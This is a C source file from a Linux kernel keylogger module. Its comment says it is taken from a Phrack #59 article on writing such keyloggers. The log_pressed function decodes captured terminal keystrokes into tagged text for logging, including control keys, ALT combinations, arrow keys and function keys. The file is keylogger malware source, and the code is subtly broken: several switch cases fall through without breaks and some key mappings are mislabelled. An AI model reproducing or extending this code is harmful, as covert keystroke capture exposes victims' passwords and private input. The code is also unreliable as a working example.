#include <linux/module.h>  /* Needed by all modules */
#include <linux/kernel.h>  /* Needed for KERN_ALERT */

#include "keylogger.h"

int log_buf(char *buf, int count);

/** This code snipped is taken from phrack #59
 *  "Writing Linux Kernel Keylogger"
 *  By rd <rd@thehackerschoice.com>
 */

void log_pressed(struct tlogger *tmp, const unsigned char *cp, int count)
{
	int i;
	DBG("tmp %p, cp : %p, count: %d, *cp: %x", tmp, cp, count, *cp);
	for (i=0; i < count; i++) {
		printk("%d: %x (%c)", i, cp[i], cp[i]);
	}
	switch(count) {
	case 1:
		switch (cp[0]) {
		  case 0x01:  //^A
			log_buf("[^A]", 4);
			break;
		  case 0x02:  //^B
			log_buf("[^B]", 4);
			break;
		  case 0x03:  //^C
			log_buf("[^C]", 4);
		  case 0x04:  //^D
			log_buf("[^D]", 4);
		  case 0x0D:  //^M
		  case 0x0A:
			log_buf("[ENTER]", 8);
			break;
		  case 0x05:  //^E
			log_buf("[^E]", 4);
			break;
		  case 0x06:  //^F
			log_buf("[^F]", 4);
			break;
		  case 0x07:  //^G
			log_buf("[^G]", 4);
			break;
		  case 0x09:  //TAB - ^I
			log_buf("[TAB]", 5);
			break;
		  case 0x0b:  //^K
			log_buf("[^K]", 4);
			break;
		  case 0x0c:  //^L
			log_buf("[^L]", 4);
			break;
		  case 0x0e:  //^E
			log_buf("[^E]", 4);
			break;
		  case 0x0f:  //^O
			log_buf("[^O]", 4);
			break;
		  case 0x10:  //^P
			log_buf("[^P]", 4);
			break;
		  case 0x11:  //^Q
			log_buf("[^Q]", 4);
			break;
		  case 0x12:  //^R
			log_buf("[^R]", 4);
			break;
		  case 0x13:  //^S
			log_buf("[^S]", 4);
			break;
		  case 0x14:  //^T
			log_buf("[^T]", 4);
			break;
#if 0
		  case 0x15:  //CTRL-U
			resetbuf(tmp);
			break;
#endif
		  case 0x16:  //^V
			log_buf("[^V]", 4);
			break;
		  case 0x17:  //^W
			log_buf("[^W]", 4);
			break;
		  case 0x18:  //^X
			log_buf("[^X]", 4);
			break;
		  case 0x19:  //^Y
			log_buf("[^Y]", 4);
			break;
		  case 0x1a:  //^Z
			log_buf("[^Z]", 4);
			break;
		  case 0x1c:  //^\
			log_buf("[^\\]", 4);
			break;
		  case 0x1d:  //^]
			log_buf("[^]]", 4);
			break;
		  case 0x1e:  //^^
			log_buf("[^^]", 4);
			break;
		  case 0x1f:  //^_
			log_buf("[^_]", 4);
			break;
		  default:
			log_buf(&cp[0], 1);
			break;
#if 0
	  case BACK_SPACE_CHAR1:
	  case BACK_SPACE_CHAR2:
		if (!tmp->lastpos) break;
		if (tmp->buf[tmp->lastpos-1] != ']')
		  tmp->buf[--tmp->lastpos] = 0;
		else {
		  log_buf("[^H]", 4);
		}
		break;
	  case ESC_CHAR:  //ESC
		log_buf("[ESC]", 5);
		break;
	  default:
		tmp->buf[tmp->lastpos++] = cp[0];
		tmp->buf[tmp->lastpos] = 0;
#endif
	}

	case 2:
		switch(cp[1]) {
	      case '\'':
		log_buf("[ALT-\']", 7);
		break;
	      case ',':
		log_buf("[ALT-,]", 7);
		break;
	      case '-':
		log_buf("[ALT--]", 7);
		break;
	      case '.':
		log_buf("[ALT-.]", 7);
		break;
	      case '/':
		log_buf("[ALT-/]", 7);
		break;
	      case '0':
		log_buf("[ALT-0]", 7);
		break;
	      case '1':
		log_buf("[ALT-1]", 7);
		break;
	      case '2':
		log_buf("[ALT-2]", 7);
		break;
	      case '3':
		log_buf("[ALT-3]", 7);
		break;
	      case '4':
		log_buf("[ALT-4]", 7);
		break;
	      case '5':
		log_buf("[ALT-5]", 7);
		break;
	      case '6':
		log_buf("[ALT-6]", 7);
		break;
	      case '7':
		log_buf("[ALT-7]", 7);
		break;
	      case '8':
		log_buf("[ALT-8]", 7);
		break;
	      case '9':
		log_buf("[ALT-9]", 7);
		break;
	      case ';':
		log_buf("[ALT-;]", 7);
		break;
	      case '=':
		log_buf("[ALT-=]", 7);
		break;
	      case '[':
		log_buf("[ALT-[]", 7);
		break;
	      case '\\':
		log_buf("[ALT-\\]", 7);
		break;
	      case ']':
		log_buf("[ALT-]]", 7);
		break;
	      case '`':
		log_buf("[ALT-`]", 7);
		break;
	      case 'a':
		log_buf("[ALT-A]", 7);
		break;
	      case 'b':
		log_buf("[ALT-B]", 7);
		break;
	      case 'c':
		log_buf("[ALT-C]", 7);
		break;
	      case 'd':
		log_buf("[ALT-D]", 7);
		break;
	      case 'e':
		log_buf("[ALT-E]", 7);
		break;
	      case 'f':
		log_buf("[ALT-F]", 7);
		break;
	      case 'g':
		log_buf("[ALT-G]", 7);
		break;
	      case 'h':
		log_buf("[ALT-H]", 7);
		break;
	      case 'i':
		log_buf("[ALT-I]", 7);
		break;
	      case 'j':
		log_buf("[ALT-J]", 7);
		break;
	      case 'k':
		log_buf("[ALT-K]", 7);
		break;
	      case 'l':
		log_buf("[ALT-L]", 7);
		break;
	      case 'm':
		log_buf("[ALT-M]", 7);
		break;
	      case 'n':
		log_buf("[ALT-N]", 7);
		break;
	      case 'o':
		log_buf("[ALT-O]", 7);
		break;
	      case 'p':
		log_buf("[ALT-P]", 7);
		break;
	      case 'q':
		log_buf("[ALT-Q]", 7);
		break;
	      case 'r':
		log_buf("[ALT-R]", 7);
		break;
	      case 's':
		log_buf("[ALT-S]", 7);
		break;
	      case 't':
		log_buf("[ALT-T]", 7);
		break;
	      case 'u':
		log_buf("[ALT-U]", 7);
		break;
	      case 'v':
		log_buf("[ALT-V]", 7);
		break;
	      case 'x':
		log_buf("[ALT-X]", 7);
		break;
	      case 'y':
		log_buf("[ALT-Y]", 7);
		break;
	      case 'z':
		log_buf("[ALT-Z]", 7);
		break;
	    }
	    break;
      case 3:
	    switch(cp[2]) {
	      case 68:
		// Left: 27 91 68
		log_buf("[LEFT]", 6);
		break;
	      case 67:
		// Right: 27 91 67
		log_buf("[RIGHT]", 7);
		break;
	      case 65:
		// Up: 27 91 65
		log_buf("[UP]", 4);
		break;
	      case 66:
		// Down: 27 91 66
		log_buf("[DOWN]", 6);
		break;
	      case 80:
		// Pause/Break: 27 91 80 
		log_buf("[BREAK]", 7);
		break;
	    }
	    break;
      case 4:
	    switch(cp[3]) {
	      case 65:
		// F1: 27 91 91 65
		log_buf("[F1]", 4);
		break;
	      case 66:
		// F2: 27 91 91 66
		log_buf("[F2]", 4);
		break;
	      case 67:
		// F3: 27 91 91 67
		log_buf("[F3]", 4);
		break;
	      case 68:
		// F4: 27 91 91 68
		log_buf("[F4]", 4);
		break;
	      case 69:
		// F5: 27 91 91 69
		log_buf("[F5]", 4);
		break;
	      case 126:
		switch(cp[2]) {
		  case 53:
		    // PgUp: 27 91 53 126
		    log_buf("[PgUP]", 6);
		    break;
		  case 54:
		    // PgDown: 27 91 54 126
		    log_buf(
		      "[PgDOWN]", 8);
		    break;
		  case 49:
		    // Home: 27 91 49 126
		    log_buf("[HOME]", 6);
		    break;
		  case 52:
		    // End: 27 91 52 126
		    log_buf("[END]", 5);
		    break;
		  case 50:
		    // Insert: 27 91 50 126
		    log_buf("[INS]", 5);
		    break;
		  case 51:
		    // Delete: 27 91 51 126
		    log_buf("[DEL]", 5);
		    break;
		}
	      break;
	    }
	    break;
      case 5:
	    if(cp[2] == 50)
	      switch(cp[3]) {
		case 48:
		  // F9: 27 91 50 48 126
		  log_buf("[F9]", 4);
		  break;
		case 49:
		  // F10: 27 91 50 49 126
		  log_buf("[F10]", 5);
		  break;
		case 51:
		  // F11: 27 91 50 51 126
		  log_buf("[F11]", 5);
		  break;
		case 52:
		  // F12: 27 91 50 52 126
		  log_buf("[F12]", 5);
		  break;
		case 53:
		  // Shift-F1: 27 91 50 53 126
		  log_buf("[SH-F1]", 7);
		  break;
		case 54:
		  // Shift-F2: 27 91 50 54 126
		  log_buf("[SH-F2]", 7);
		  break;
		case 56:
		  // Shift-F3: 27 91 50 56 126
		  log_buf("[SH-F3]", 7);
		  break;
		case 57:
		  // Shift-F4: 27 91 50 57 126
		  log_buf("[SH-F4]", 7);
		  break;
	      }
	    else
	      switch(cp[3]) {
		case 55:
		  // F6: 27 91 49 55 126
		  log_buf("[F6]", 4);
		  break;
		case 56:
		  // F7: 27 91 49 56 126
		  log_buf("[F7]", 4);
		  break;
		case 57:
		  // F8: 27 91 49 57 126
		  log_buf("[F8]", 4);
		  break;
		case 49:
		  // Shift-F5: 27 91 51 49 126
		  log_buf("[SH-F5]", 7);
		  break;
		case 50:
		  // Shift-F6: 27 91 51 50 126
		  log_buf("[SH-F6]", 7);
		  break;
		case 51:
		  // Shift-F7: 27 91 51 51 126
		  log_buf("[SH-F7]", 7);
		  break;
		case 52:
		  // Shift-F8: 27 91 51 52 126
		  log_buf("[SH-F8]", 7);
		  break;
	      };
	    break;
      default:  // Unknow
	    break;
    }
}
